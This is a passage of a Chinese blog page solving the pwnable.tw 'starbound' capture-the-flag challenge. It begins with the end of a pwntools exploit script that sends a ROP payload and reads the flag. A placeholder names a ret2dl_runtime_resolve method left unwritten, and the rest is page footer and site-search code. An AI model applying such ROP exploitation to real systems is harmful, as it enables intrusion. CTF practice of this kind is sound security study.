class="number">0x8048A30</span>)+p32(<span class="number">0x804A605</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x80580F0</span>)+p32(<span class="number">0x30</span>)</span><br><span class="line">send_payload(val1,val2)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 收flag！</span></span><br><span class="line">flag = io.recv(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="方法3：ret2dl-runtime-resolve"   >
+          <a href="#方法3：ret2dl-runtime-resolve" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法3：ret2dl-runtime-resolve" class="headerlink" title="方法3：ret2dl_runtime_resolve"></a>方法3：ret2dl_runtime_resolve</h2>
+      <p>看了别人的wp，基本上都是用这种方法来做的。这种方法比较保险，但是过程有点复杂。</p>
+<p>犯懒了，哪天想起来再补上吧~</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2021/10/02/starbound/">http://blingblingxuanxuan.github.io/2021/10/02/starbound/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/09/25/analysis-of-totolink-t10/"><span class="paginator-prev__text">TOTOLINK T10旧版本漏洞挖掘和分析</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnable-tw%E4%B9%8Bstarbound"><span class="toc-number">1.</span> <span class="toc-text">
+          pwnable.tw之starbound</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
+          漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
+          漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E6%B3%84%E9%9C%B2libc%E7%89%88%E6%9C%AC"><span class="toc-number">3.1.</span> <span class="toc-text">
+          方法1：泄露libc版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9AORW"><span class="toc-number">3.2.</span> <span class="toc-text">
+          方法2：ORW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9Aret2dl-runtime-resolve"><span class="toc-number">3.3.</span> <span class="toc-text">
+          方法3：ret2dl_runtime_resolve</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
